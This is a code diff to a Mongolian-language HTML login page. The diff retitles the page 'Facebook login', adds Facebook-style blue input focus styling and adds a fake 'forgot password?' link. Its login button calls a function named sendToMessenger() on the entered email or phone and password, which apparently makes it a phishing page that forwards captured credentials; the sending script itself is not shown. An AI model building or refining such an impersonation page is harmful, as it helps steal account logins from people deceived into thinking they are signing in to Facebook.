@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Нэвтрэх</title>
+    <title>Facebook Нэвтрэх</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -23,7 +23,7 @@
             text-align: center;
         }
         .login-container h2 {
-            font-size: 24px;
+            font-size: 28px;
             color: #1877f2;
             margin-bottom: 20px;
         }
@@ -34,6 +34,11 @@
             border: 1px solid #ddd;
             border-radius: 5px;
             font-size: 16px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            border-color: #1877f2;
+            outline: none;
         }
         .login-btn {
             width: 100%;
@@ -50,6 +55,15 @@
         .login-btn:hover {
             background: #166fe5;
         }
+        .forgot-password {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
@@ -59,6 +73,7 @@
         <input type="text" id="username" placeholder="Имэйл эсвэл утасны дугаар" required>
         <input type="password" id="password" placeholder="Нууц үг" required>
         <button class="login-btn" onclick="sendToMessenger()">Нэвтрэх</button>
+        <a href="#" class="forgot-password">Нууц үгээ мартсан уу?</a>
     </div>
 
     <script src="script.js"></script>
